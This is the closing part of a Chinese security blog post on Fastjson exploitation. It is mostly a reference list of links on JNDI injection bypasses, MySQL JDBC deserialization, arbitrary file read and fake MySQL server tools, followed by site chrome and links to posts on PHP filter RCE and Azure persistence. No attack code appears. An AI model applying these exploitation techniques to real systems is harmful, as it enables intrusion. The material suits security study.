<p><a target="_blank" rel="noopener" href="https://github.com/WhiteHSBG/JNDIExploit">WhiteHSBG/JNDIExploit: 对原版 进行了实用化修改</a></p>
<p><a target="_blank" rel="noopener" href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">如何绕过高版本JDK的限制进行JNDI注入利用 – KINGX</a></p>
<p><a target="_blank" rel="noopener" href="https://lemono.fun/JNDI_Bypass_HighJDK/">JNDI在JDK高版本下Bypass手法复现和分析 | Lemono’ Blog</a></p>
<h3 id="远程利用出现Timeout"><a href="#远程利用出现Timeout" class="headerlink" title="远程利用出现Timeout"></a><strong>远程利用出现Timeout</strong></h3><p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/131">深入理解JNDI注入与Java反序列化漏洞利用 - 博客 - 腾讯安全应急响应中心 (tencent.com)</a></p>
<h3 id="MySQL-JDBC-利用"><a href="#MySQL-JDBC-利用" class="headerlink" title="MySQL JDBC 利用"></a><strong>MySQL JDBC 利用</strong></h3><p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">【WEB】Java JDBC反序列化 | 狼组安全团队公开知识库 (wgpsec.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12011">JDBC MySQL任意文件读取分析 - 先知社区 (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pickmea/p/15157189.html">Fastjson Mysql JDBC 反序列化 - pickmea - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/14865722.html">Java JDBC客户端反序列化漏洞 - zpchcbd - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54648419/article/details/122842335">MySQLJDBC反序列化漏洞分析_mysql反序列化-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">fnmsd/MySQL_Fake_Server: MySQL Fake Server use to help MySQL Client File Reading and JDBC Client Java Deserialize (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/4ra1n/mysql-fake-server">4ra1n/mysql-fake-server: MySQL Fake Server (纯Java实现，支持GUI版和命令行版，提供Dockerfile，支持多种常见JDBC利用) (github.com)</a></p>

            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">YangHao</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://yanghaoi.github.io/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/">https://yanghaoi.github.io/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">YangHao</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/Fastjson/">
                                    <span class="chip bg-color">Fastjson</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/valine/av-min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'yJD2aXK8GcbXmInljhvHyB1j-gzGzoHsz',
        appKey: 'p2SkNvakylQnkba2lMvTS09d',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/12/04/phpfilters-he-cve-2024-2961-cong-wen-jian-du-qu-dao-rce/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/featureimages/0.jpg" class="responsive-img" alt="">
                        
                        <span class="card-title"></span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            PHP filters和CVE-2024-2961组合:从文件读取到RCE1. 简介 glibc（GNU C Library）是 GNU 项目的一部分，主要为基于 Unix 的系统（如 Linux）提供 C 标准库和底层系统调用接口。
CV
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-12-04
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            YangHao
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/08/29/li-yong-azureattestservice-chi-jiu-hua/">
                    <div class="card-image">
                        
                        <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/featureimages/17.jpg" class="responsive-img" alt="利用Azure Attest Service持久化">
                        
                        <span class="card-title">利用Azure Attest Service持久化</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            由于Azure Attest Service服务安装程序未对服务DLL进行安全验证，可通过命令行注册服务DLL，可利用该特点绕过安全软件监控进行权限维持。
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-29
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="post-category">
                                    权限维持
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/LOLBAS/">
                        <span class="chip bg-color">LOLBAS</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('1120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: Yang Hao&#39;s blog<br />'
            + '文章作者: YangHao<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('5'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            <span id="year">2020</span>
            <a href="/about" target="_blank">YangHao</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">73.2k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2020";
                    var startMonth = "08";
                    var startDate = "10";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已缓慢运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已缓慢运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            

			<br>
			
            <span id="showcdn" style='display:none;'>当前CDN节点: <span id="cdn">【未知】</span>&nbsp;|&nbsp;你的ip: <span id="ip">【未知】</span>&nbsp;|&nbsp;你的所在国家/地区: <span id="loc">【未知】</span></span>
            <script>
                	getCDNinfo = function() {
	$.ajax({
		url: "https://cdnjs.cloudflare.com/cdn-cgi/trace",
		success: function(data, status) {
			let areas = "Antananarivo, Madagascar - (TNR);Cape Town, South Africa - (CPT);Casablanca, Morocco - (CMN);Dar Es Salaam, Tanzania - (DAR);Djibouti City, Djibouti - (JIB);Durban, South Africa - (DUR);Johannesburg, South Africa - (JNB);Kigali, Rwanda - (KGL);Lagos, Nigeria - (LOS);Luanda, Angola - (LAD);Maputo, MZ - (MPM);Mombasa, Kenya - (MBA);Port Louis, Mauritius - (MRU);Réunion, France - (RUN);Bangalore, India - (BLR);Bangkok, Thailand - (BKK);Bandar Seri Begawan, Brunei - (BWN);Cebu, Philippines - (CEB);Chengdu, China - (CTU);Chennai, India - (MAA);Chittagong, Bangladesh - (CGP);Chongqing, China - (CKG);Colombo, Sri Lanka - (CMB);Dhaka, Bangladesh - (DAC);Dongguan, China - (SZX);Foshan, China - (FUO);Fuzhou, China - (FOC);Guangzhou, China - (CAN);Hangzhou, China - (HGH);Hanoi, Vietnam - (HAN);Hengyang, China - (HNY);Ho Chi Minh City, Vietnam - (SGN);Hong Kong - (HKG);Hyderabad, India - (HYD);Islamabad, Pakistan - (ISB);Jakarta, Indonesia - (CGK);Jinan, China - (TNA);Karachi, Pakistan - (KHI);Kathmandu, Nepal - (KTM);Kolkata, India - (CCU);Kuala Lumpur, Malaysia - (KUL);Lahore, Pakistan - (LHE);Langfang, China - (NAY);Luoyang, China - (LYA);Macau - (MFM);Malé, Maldives - (MLE);Manila, Philippines - (MNL);Mumbai, India - (BOM);Nagpur, India - (NAG);Nanning, China - (NNG);New Delhi, India - (DEL);Osaka, Japan - (KIX);Phnom Penh, Cambodia - (PNH);Qingdao, China - (TAO);Seoul, South Korea - (ICN);Shanghai, China - (SHA);Shenyang, China - (SHE);Shijiazhuang, China - (SJW);Singapore, Singapore - (SIN);Suzhou, China - (SZV);Taipei - (TPE);Thimphu, Bhutan - (PBH);Tianjin, China - (TSN);Tokyo, Japan - (NRT);Ulaanbaatar, Mongolia - (ULN);Vientiane, Laos - (VTE);Wuhan, China - (WUH);Wuxi, China - (WUX);Xi'an, China - (XIY);Yerevan, Armenia - (EVN);Zhengzhou, China - (CGO);Zuzhou, China - (CSX);Amsterdam, Netherlands - (AMS);Athens, Greece - (ATH);Barcelona, Spain - (BCN);Belgrade, Serbia - (BEG);Berlin, Germany - (TXL);Brussels, Belgium - (BRU);Bucharest, Romania - (OTP);Budapest, Hungary - (BUD);Chișinău, Moldova - (KIV);Copenhagen, Denmark - (CPH);Cork, Ireland -  (ORK);Dublin, Ireland - (DUB);Düsseldorf, Germany - (DUS);Edinburgh, United Kingdom - (EDI);Frankfurt, Germany - (FRA);Geneva, Switzerland - (GVA);Gothenburg, Sweden - (GOT);Hamburg, Germany - (HAM);Helsinki, Finland - (HEL);Istanbul, Turkey - (IST);Kyiv, Ukraine - (KBP);Lisbon, Portugal - (LIS);London, United Kingdom - (LHR);Luxembourg City, Luxembourg - (LUX);Madrid, Spain - (MAD);Manchester, United Kingdom - (MAN);Marseille, France - (MRS);Milan, Italy - (MXP);Moscow, Russia - (DME);Munich, Germany - (MUC);Nicosia, Cyprus - (LCA);Oslo, Norway - (OSL);Paris, France - (CDG);Prague, Czech Republic - (PRG);Reykjavík, Iceland - (KEF);Riga, Latvia - (RIX);Rome, Italy - (FCO);Saint Petersburg, Russia - (LED);Sofia, Bulgaria - (SOF);Stockholm, Sweden - (ARN);Tallinn, Estonia - (TLL);Thessaloniki, Greece - (SKG);Vienna, Austria - (VIE);Vilnius, Lithuania - (VNO);Warsaw, Poland - (WAW);Zagreb, Croatia - (ZAG);Zürich, Switzerland - (ZRH);Arica, Chile - (ARI);Asunción, Paraguay - (ASU);Bogotá, Colombia - (BOG);Buenos Aires, Argentina - (EZE);Curitiba, Brazil - (CWB);Fortaleza, Brazil - (FOR);Guatemala City, Guatemala - (GUA);Lima, Peru - (LIM);Medellín, Colombia - (MDE);Panama City, Panama - (PTY);Porto Alegre, Brazil - (POA);Quito, Ecuador - (UIO);Rio de Janeiro, Brazil - (GIG);São Paulo, Brazil - (GRU);Santiago, Chile - (SCL);Willemstad, Curaçao - (CUR);St. George's, Grenada - (GND);Amman, Jordan - (AMM);Baghdad, Iraq - (BGW);Baku, Azerbaijan - (GYD);Beirut, Lebanon - (BEY);Doha, Qatar - (DOH);Dubai, United Arab Emirates - (DXB);Kuwait City, Kuwait - (KWI);Manama, Bahrain - (BAH);Muscat, Oman - (MCT);Ramallah - (ZDM);Riyadh, Saudi Arabia - (RUH);Tel Aviv, Israel - (TLV);Ashburn, VA, United States - (IAD);Atlanta, GA, United States - (ATL);Boston, MA, United States - (BOS);Buffalo, NY, United States - (BUF);Calgary, AB, Canada - (YYC);Charlotte, NC, United States - (CLT);Chicago, IL, United States - (ORD);Columbus, OH, United States - (CMH);Dallas, TX, United States - (DFW);Denver, CO, United States - (DEN);Detroit, MI, United States - (DTW);Honolulu, HI, United States - (HNL);Houston, TX, United States - (IAH);Indianapolis, IN, United States - (IND);Jacksonville, FL, United States - (JAX);Kansas City, MO, United States - (MCI);Las Vegas, NV, United States - (LAS);Los Angeles, CA, United States - (LAX);McAllen, TX, United States - (MFE);Memphis, TN, United States - (MEM);Mexico City, Mexico - (MEX);Miami, FL, United States - (MIA);Minneapolis, MN, United States - (MSP);Montgomery, AL, United States - (MGM);Montréal, QC, Canada - (YUL);Nashville, TN, United States - (BNA);Newark, NJ, United States - (EWR);Norfolk, VA, United States - (ORF);Omaha, NE, United States - (OMA);Philadelphia, United States - (PHL);Phoenix, AZ, United States - (PHX);Pittsburgh, PA, United States - (PIT);Port-Au-Prince, Haiti - (PAP);Portland, OR, United States - (PDX);Queretaro, MX, Mexico - (QRO);Richmond, Virginia - (RIC);Sacramento, CA, United States - (SMF);Salt Lake City, UT, United States - (SLC);San Diego, CA, United States - (SAN);San Jose, CA, United States - (SJC);Saskatoon, SK, Canada - (YXE);Seattle, WA, United States - (SEA);St. Louis, MO, United States - (STL);Tampa, FL, United States - (TPA);Toronto, ON, Canada - (YYZ);Vancouver, BC, Canada - (YVR);Tallahassee, FL, United States - (TLH);Winnipeg, MB, Canada - (YWG);Adelaide, SA, Australia - (ADL);Auckland, New Zealand - (AKL);Brisbane, QLD, Australia - (BNE);Melbourne, VIC, Australia - (MEL);Noumea, New caledonia - (NOU);Perth, WA, Australia - (PER);Sydney, NSW, Australia - (SYD)".split(";");
			let area = data.split("colo=")[1].split("\n")[0];
			for (var i = 0; i < areas.length; i++) {
				if (areas[i].indexOf(area) != -1) {
					$("#cdn").text(areas[i]);
					$("#ip").text(data.split("ip=")[1].split("\n")[0]);
					$("#loc").text(data.split("loc=")[1].split("\n")[0]);
					break;
				}
			}
			$("#showcdn").css('display','block');
		}
	})
}
$(document).ready(function() {
	getCDNinfo();
});
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">














    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>






    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/search.xml", 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>

	
    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/materialize/materialize.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/aos/aos.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/js/matery.js"></script>


    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    
    <script async src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    

    

    

    
    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
